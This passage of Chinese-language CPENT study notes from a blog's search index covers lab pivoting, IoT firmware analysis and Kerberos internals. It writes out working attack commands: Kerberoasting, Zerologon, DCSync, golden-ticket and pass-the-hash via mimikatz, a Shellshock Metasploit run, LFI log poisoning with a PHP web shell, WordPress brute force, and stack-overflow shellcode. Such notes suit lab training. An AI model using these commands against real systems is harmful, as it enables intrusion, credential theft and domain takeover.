class="hljs-number">726500</span>D4FF:<span class="hljs-number">92937945</span>B<span class="hljs-number">51881434</span>1DE3F<span class="hljs-number">726500</span>D4FF&#x27; <span class="hljs-comment">//&lt;ip&gt; cmd.exe</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>RDP連線相關</b></p><ul><li><p>rdesktop(停更)</p></li><li><p>xfreerdp (版本須為2.3.0)</p>  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">lib <span class="hljs-keyword">so</span> 檢查<br>sudo dpkg -<span class="hljs-keyword">l</span> |<span class="hljs-keyword">grep</span> freerdp<br></code></pre></td></tr></table></figure></li><li><p>xfreerdp 連線</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp /v:172.19.19.20 /u:administrator /p:<span class="hljs-string">&#x27;Pa$$w0rd&#x27;</span> /size:90%<br></code></pre></td></tr></table></figure></li><li><p>開啟rdp</p>  <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><b>Pivot 跳板</b></p><ul><li><p>SSH port forwarding (SSH tunneling)</p><ul><li><p>Local</p><ul><li>ssh server(70) target(24)  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -nNTL *:<span class="hljs-number">80</span>:<span class="hljs-number">172.19.19.24:80</span> administrator@<span class="hljs-number">172.19.19.70</span><br></code></pre></td></tr></table></figure>  <img src="https://i.imgur.com/kOmzS3I.png"></li></ul></li><li><p>Remote</p><ul><li>nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config <add GatewayPorts yes>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -R *:<span class="hljs-number">8008</span>:<span class="hljs-number">172.19.19.24:80</span> administrator@<span class="hljs-number">172.19.19.70</span><br></code></pre></td></tr></table></figure>  <img src="https://i.imgur.com/AJ4VstX.png"></li></ul></li><li><p>Dynamic (proxychain)</p><ul><li>nano &#x2F;etc&#x2F;proxychains.conf  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -nNTCD <span class="hljs-number">9050</span> administrator@<span class="hljs-number">172.19.19.70</span><br></code></pre></td></tr></table></figure>  <img src="https://i.imgur.com/ZK86vG5.png"></li></ul></li></ul></li><li><p>Port forwarding</p><ul><li>socat (full function,fat,support udp)<ul><li>socat tcp-listen:80,fork tcp:<ip>:80</li><li>socat udp-recvfrom:161,fork udp-sendto:<ip>:161</li></ul></li><li>datapipe   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/bovine/</span>datapipe<span class="hljs-regexp">/master/</span>datapipe.c<br><span class="hljs-comment">#程式第80行需修改</span><br><span class="hljs-comment">#define MAXCLIENTS 20 改為 999</span><br></code></pre></td></tr></table></figure><ul><li>datapipe 0.0.0.0 135 <target> 135</li><li>datapipe 0.0.0.0 445 <target> 445</li><li>datapipe 0.0.0.0 4444 <parrot> 4444</li><li>gcc datapipe.c -o datapipe</li></ul></li><li>portproxy (windows netsh built-in)<ul><li>netsh interface portproxy add v4tov4 80 <ip> 80</li><li>netsh interface portproxy show v4tov4</li></ul></li></ul></li><li><p>meterpreter</p><ul><li>msf only</li><li>session routing</li><li>also support port forwarding</li></ul></li></ul></li></ul><h2 id="IOT分析"><a href="#IOT分析" class="headerlink" title="IOT分析"></a>IOT分析</h2><ul><li><p>練習用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Apress/i</span>ot-hack-hdbk-practical-guide<br>https:<span class="hljs-regexp">//</span>kb.netgear.com<span class="hljs-regexp">/26889/</span>D6000-Firmware-Version-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>-<span class="hljs-number">0</span>-<span class="hljs-number">41</span> <br></code></pre></td></tr></table></figure></li><li><p>binwalk no such file sasquatch(error)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/useidel/</span>sasquatch (gcc10 compile success)<br></code></pre></td></tr></table></figure></li><li><p>binwalk 韌體分析</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">binwalk </span>firewarm.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure></li><li><p>binwalk 提取檔案系統</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">binwalk </span>-e firewam.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure></li><li><p>find &amp;&amp; grep 查找</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -name *passwd* -print 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><span class="hljs-keyword">grep</span> -nir passwd <br></code></pre></td></tr></table></figure></li><li><p>squashFS 介紹</p></li></ul><blockquote><p>Squashfs（.sfs）是一套供Linux核心使用的GPL開源只讀壓縮檔案系統。Squashfs能夠為檔案系統內的檔案、inode及目錄結構進行壓縮，並支援最大1024千位元組的區段，以提供更大的壓縮比。<br>Squashfs常被用於各Linux發行版的LiveCD中，也用於OpenWrt 和DD-WRT 的路由器韌體。Chromecast也是該檔案系統的使用者。</p></blockquote><ul><li>hexdump 取出總數最多(xor)<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">hexdump -v -C <span class="hljs-keyword">encrypted</span>.bin | cut -d &quot; &quot; -f <span class="hljs-number">3</span><span class="hljs-number">-20</span> |sort |uniq -c <br></code></pre></td></tr></table></figure></li></ul><h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><blockquote><p>Kerberos是一種由MIT（麻省理工大學）提出的一種網路身份驗證協議。它旨在通過使用金鑰加密技術為客戶端&#x2F;伺服器應用程式提供強身份驗證。</p></blockquote><blockquote><p>認證伺服器（Authentication Server，簡稱 AS）<br>票證授權票證（Ticket Granting Ticket，簡稱 TGT）<br>金鑰分發中心（Key Distribution Center，簡稱KDC）<br>TGS（Ticket Granting Server）&#x3D; 票據授權伺服器<br>SS（Service Server）&#x3D; 特定服務提供端</p></blockquote><ul><li><p><b>kerberos 概述及通信過程</b></p><ul><li>ASREQ: Client向KDC發起ASREQ,請求憑據是Client hash加密的時間戳</li><li>ASREP: KDC使用Client hash進行解密，如果結果正確就返回用krbtgt hash加密的TGT票據，TGT裏面包含PAC,PAC包含Client的sid，Client所在的組。 </li><li>TGSREQ: Client憑藉TGT票據向KDC發起針對特定服務的TGSREQ請求 </li><li>TGS_REP: KDC使用krbtgt hash進行解密，如果結果正確，就返回用服務hash 加密的TGS票據(這一步不管使用者有沒有訪問服務的許可權，只要TGT正確，就返回TGS票據) </li><li>AP_REQ: Client拿著TGS票據去請求服務 </li><li>AP_REP: 服務使用自己的hash解密TGS票據。如果解密正確，就拿著PAC去KDC那邊問Client有沒有訪問許可權，域控解密PAC。獲取Client的sid，以及所在的組，再根據該服務的ACL，判斷Client是否有訪問服務的許可權。<br><img src="https://i.imgur.com/11M0gNF.png"></li></ul></li><li><p><b>kerberoasting</b></p><ul><li>DC 創建SPN<ul><li>setspn -s http&#x2F;lpt.com user-one (靶機環境)</li></ul></li><li>Parrot SPN scan brute<ul><li>python3 -m pip install impacket –upgrade</li><li>GetUserSPNs.py ‘lpt.com&#x2F;cpent:Pa$$w0rd’ -dc-ip 192.168.177.19 -request -outputfile kerberos.txt</li><li>john kerberos.txt –show</li></ul></li></ul></li><li><p><b>Zerologon</b></p><ul><li><p>mimikatz </p><ul><li>清空DC認證密碼  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::zerologon  /target:域控IP  /account:域控主機名$  /exploit<br>lsadump::zerologon /target:server2019 /account:server2019 /null /ntlm /exploit<br></code></pre></td></tr></table></figure></li><li>dcsync 獲取目標雜湊(krbtgt)  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:lpt.com /dc:server2019 /authuser:administrator /authdomain:lpt.com /authpassword:Pa$<span class="hljs-variable">$w0rd</span> /user:krbtgt /authntlm<br></code></pre></td></tr></table></figure></li><li>Golden Ticket   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">注入內存前必須開啟權限<br>privilege::debug<br>kerberos::golden /domain:lpt.com /sid:&lt;sid&gt; /krbtgt:&lt;<span class="hljs-built_in">hash</span>&gt; /user:evil /ticket:evil.tck /ptt<br></code></pre></td></tr></table></figure></li><li>pth  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /user:administrator /domain:lpt.com /ntlm:&lt;<span class="hljs-built_in">hash</span>&gt;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>PowerView.ps1</p>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1<br>powershell -&gt; 物件導向 <br><br>cmd -&gt; powershell -nop -ep bypass  ###Bypass <span class="hljs-keyword">Policy</span><br><span class="hljs-keyword">Import</span>-Module .\powerview.ps1<br><br><span class="hljs-keyword">Get</span>-Forest  ### <span class="hljs-keyword">Domain</span> -&gt; Tree -&gt; Forest<br><span class="hljs-keyword">Get</span>-DomainComputer |<span class="hljs-keyword">select</span> -Property <span class="hljs-type">name</span>,dnshostname<br><span class="hljs-keyword">Get</span>-DomainUser | <span class="hljs-keyword">select</span> -Property <span class="hljs-type">name</span>,givenname<br><br>查看共享資料夾<br>net <span class="hljs-keyword">share</span><br>查看遠端共享資料夾<br>net <span class="hljs-keyword">view</span> \\server2019\\<br>dir \\server2019\users<br></code></pre></td></tr></table></figure></li><li><p>參考資料</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">透過ssh ptT(pass the ticket)<br><span class="hljs-symbol">https:</span>//zhuanlan.zhihu.com/p/<span class="hljs-number">27242393</span><br>   <br>pass the ticket技巧<br><span class="hljs-symbol">https:</span>//wooyun.js.org/drops/<span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>F<span class="hljs-variable">%9</span>F<span class="hljs-variable">%E6</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%97</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%80</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%94</span>Pass<span class="hljs-variable">%20</span>The<span class="hljs-variable">%20</span>Ticket.html<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul><li>SHELLSHOCK<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/cgi-bin/</span><br><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>/cgi-bin<br><br>msfconsole<br>search shellshock<br>use exploit<span class="hljs-regexp">/multi/</span>http/apache_mod_cgi_bash_env_exec<br>show options<br>set RHOSTS <span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span><br>set TARGETURI <span class="hljs-regexp">/cgi-bin/</span>keygen<br>exploit<br></code></pre></td></tr></table></figure></li><li>Wordpress<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">LFI to RCE<br>on <span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>:<br><br>cd <span class="hljs-regexp">/var/</span>www<br><br>gedit include.php<br><br>&lt;?php<br>  include(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>?&gt;<br><br>chmod <span class="hljs-number">775</span> -R <span class="hljs-regexp">/var/</span>log/apache2<br>tail <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br><br>on Parrot:<br>    browser to http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>/include.php?file=<br><br>REF TO:<br><br>    <span class="hljs-regexp">/var/</span>log/auth.log <span class="hljs-comment"># inject via SSH login username</span><br><br>    <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log <span class="hljs-comment"># inject via browser User Agent header</span><br><br>    <span class="hljs-regexp">/proc/</span>self/environ <span class="hljs-comment"># inject via browser cookie header</span><br><br><span class="hljs-comment">#inject example : &lt;?php system($_GET[1]); ?&gt;</span><br><br>wpscan --url http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>/wordpress -e<br><br><span class="hljs-comment"># e.g. wordpress site editor 1.1.1</span><br><br><span class="hljs-comment"># https://www.exploit-db.com/exploits/44340</span><br><br>wpscan --url http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span><span class="hljs-regexp">/wordpress -U mike -P Wordlists/</span>Passwords.txt <br></code></pre></td></tr></table></figure></li></ul><h2 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">PE:</span> Windows 可執行文件<br><span class="hljs-symbol">ELF:</span> linux 可執行文件<br><br>定址空間 = address * databus(<span class="hljs-number">8</span><span class="hljs-type">byte</span>)<br>x86 = <span class="hljs-number">2</span>^<span class="hljs-number">32</span> * <span class="hljs-number">8</span><span class="hljs-type">byte</span> = <span class="hljs-number">4</span>Gbytes<br>x64 = <span class="hljs-number">2</span>^<span class="hljs-number">64</span> * <span class="hljs-number">8</span><span class="hljs-type">byte</span> = <span class="hljs-number">18</span>Ebytes<br></code></pre></td></tr></table></figure><ul><li><p>程式編譯流程</p><ul><li>C source code -&gt; compile -&gt; object code -&gt; link -&gt; executable<br>  <img src="https://i.imgur.com/XaArDi2.png"></li></ul></li><li><p>C語言程式記憶體配置<br><img src="https://i.imgur.com/iUZjmLj.png"></p></li><li><p>Text 程式碼區段</p><blockquote><p>文字區段（text segment）也稱為程式碼區段（code segment），這裡存放的是可執行的 CPU 指令（instructions）。<br>這個區段通常位於 heap 或 stack 之後，避免因 heap 或 stack 溢位而覆寫 CPU 指令。<br>通常文字區段的資料是可以共用的，當多個同樣的程式在執行時，在記憶體中只需要存有一份就夠了，而這個文字區段通常都是唯讀的，避免程式本身誤改了自己的 CPU 指令。</p></blockquote></li><li><p>Data 初始化靜態變數</p><blockquote><p>初始化資料區段（initialized data segment）儲存的是一些已經初始化的靜態變數，例如有經過初始化的 C 語言的全域變數（global variables）以及靜態變數（static variables）都是儲存於此處。<br>這個區段的變數又可分為唯讀區域（read-only area）以及可讀寫區域（read-write area），可讀寫區域用於存放一般變數，其資料會隨著程式的執行而改變，而唯讀區域則是存放固定的常數。</p></blockquote></li><li><p>Bss 未初始化靜態變數</p><blockquote><p>未初始化資料區段（uninitialized data segment）又稱為 bss 區段（這個名稱的起源來自於古老的組譯器，代表 block started by symbol）是儲存尚未被初始化的靜態變數，而這些變數在程式執行之前會被系統初始化為 0 或是 null。</p></blockquote></li><li><p>Stack 區域變數</p><blockquote><p>堆疊區段（stack segment）用於儲存函數的區域變數，以及各種函數呼叫時需要儲存的資訊（例如函數返回的記憶體位址還有呼叫者函數的狀態等），每一次的函數呼叫就會在堆疊區段建立一個 stack frame，儲存該次呼叫的所有變數與狀態，這樣一來同一個函數重複被呼叫時就會有不同的 stack frame，不會互相干擾，遞迴函數就是透過這樣的機制來執行的。</p></blockquote></li><li><p>Heap 動態配置變數</p><blockquote><p>heap 區段的記憶體空間用於儲存動態配置的變數，例如 C 語言的 malloc 以及 C++ 的 new 所建立的變數都是儲存於此。<br>堆疊區段一般的狀況會從高記憶體位址往低記憶體位址成長，而 heap 剛好從對面以相反的方向成長。</p></blockquote></li><li><p>System 命令列參數與環境變數</p><blockquote><p>system 區段用於儲存一些命令列參數與環境變數，這部分會跟系統有關。</p></blockquote></li></ul><hr><ul><li><p>組合語言體系</p><ul><li>AT&amp;T</li><li>Intel</li></ul></li><li><p>函式庫呼叫</p><ul><li>windows visual studio(MSVCRT.dll)<ul><li>microsoft visual c runtime (msvcrt)<ul><li>動態連結呼叫需要 如無須裝可轉散發套件</li></ul></li></ul></li><li>linux gdb (gnu c libary) &#x3D;&#x3D; libc<ul><li>提供標準c函式</li></ul></li></ul></li><li><p>ldd : 列出與檔案有關的分享函式庫</p></li><li><p>file :分析程式類型<br><img src="https://i.imgur.com/HQ42pHc.png"></p></li><li><p>strings : 輸出二進位文件可輸出字串<br><img src="https://i.imgur.com/jOgXutT.png"></p></li><li><p>查看程式調用多少 C API</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings crackme0x00a <span class="hljs-string">| grep @@</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/9BDdUi4.png"></p></li><li><p>找出main函式</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">readelf -a crackme0x00a <span class="hljs-string">|grep main</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HYzXuBv.png"></p></li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">r2</span> crackme0x00a<br>pdf @ main<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PhH6S1y.png"></p><ul><li><p>gdb (disassemble main)</p></li><li><p>objdump -d crackme0x00a</p></li><li><p>查看暫存器</p><ul><li>gdb -q &#x2F;bin&#x2F;bash</li><li>break main</li><li>run</li><li>info registers</li></ul></li><li><p>ASLR</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">### <span class="hljs-number">2</span>為全開<br>sysctl -a --parrten randomize<br>### 關閉ASLR<br>sudo sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/bddP1HQ.png"></p></li></ul><hr><p><img src="https://i.imgur.com/SVsCZ38.png"></p><ul><li><p>shellcode.c (setuid 0)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">gcc -o shellcode -z execstack shellcode.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/EoAwz9U.png"></p></li><li><p>stack.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -o stack -z execstack -fno-stack-protector stack.c<br>sudo chown root:root stack<br>sudo chmod <span class="hljs-number">4755</span> stack<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">gdb -<span class="hljs-selector-tag">q</span> stack<br>disassemble <span class="hljs-selector-tag">main</span><br><span class="hljs-selector-tag">b</span> *<span class="hljs-selector-tag">main</span> +<span class="hljs-number">55</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/la2huTp.png"></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">pattern</span> <span class="hljs-keyword">create</span> <span class="hljs-number">500</span> badfile<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/p1yXJqR.png"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">disassemble bof<br>run<br>c ### 溢出<br>pattern search<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/JX3aPUL.png"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment">### 變數傳值</span><br><span class="hljs-keyword">push</span> eax<br><span class="hljs-keyword">call</span> <span class="hljs-keyword">function</span> <br><span class="hljs-comment">### 字串</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span>x8048620<br><span class="hljs-keyword">call</span> <span class="hljs-keyword">function</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HrmdwjK.png"></p><ul><li><p>shellcode</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs wren">\<span class="hljs-variable">x31</span>\<span class="hljs-variable">xc0</span>\<span class="hljs-variable">x50</span>\<span class="hljs-variable">x68</span><span class="hljs-comment">//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><br><br><span class="hljs-variable">shellcode</span>.<span class="hljs-property">py</span><br><br><span class="hljs-variable">print</span> <span class="hljs-string">&quot;A*42&quot;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;注入點&quot;</span> <span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x90</span>&quot;</span> <span class="hljs-operator">*</span><span class="hljs-number">16</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>//sh<span class="hljs-char escape_">\x68</span>/bin<span class="hljs-char escape_">\x89</span>\xe3<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x89</span>\xe1<span class="hljs-char escape_">\x99</span>\xb0\x0b\xcd<span class="hljs-char escape_">\x80</span>&quot;</span> <br><br><span class="hljs-variable">python</span> ./<span class="hljs-variable">shellcode</span>.<span class="hljs-property">py</span> <span class="hljs-operator">&gt;</span> <span class="hljs-variable">badfile</span><br><br></code></pre></td></tr></table></figure></li><li><p>return to libc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc stack.c -fno-stack-protector -znoexecstack -o retlibc<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">### NX enable<br><br>gdb -q retlibc<br>b main<br>r<br>## 程式必須run 載入記憶體<br>p <span class="hljs-keyword">system</span>  ### 尋找<span class="hljs-keyword">system</span>函數記憶體位置<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/of4OSK5.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">p <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/m3DdKYg.png"></p><ul><li><p>計算函數偏移值</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">p system-<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/cRKoHpU.png"></p></li><li><p>尋找&#x2F;bin&#x2F;sh 記憶體位置</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">### peda<br>find /bin/sh<br>vmmap <br>### gdb<br>info proc mappings<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/xpjNnS7.png"></p></li><li><p>print shellcode  </p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot; <span class="hljs-string">&#x27;A&#x27;</span>*42 + <span class="hljs-string">&#x27;mem system&#x27;</span> + <span class="hljs-string">&#x27;BBBB or mem exit&#x27;</span> + <span class="hljs-string">&#x27;mem /bin/sh&#x27;</span> &quot;<br></code></pre></td></tr></table></figure></li><li><p>egg hunter (linux env shellcode)</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>筆記</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPENT</tag>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
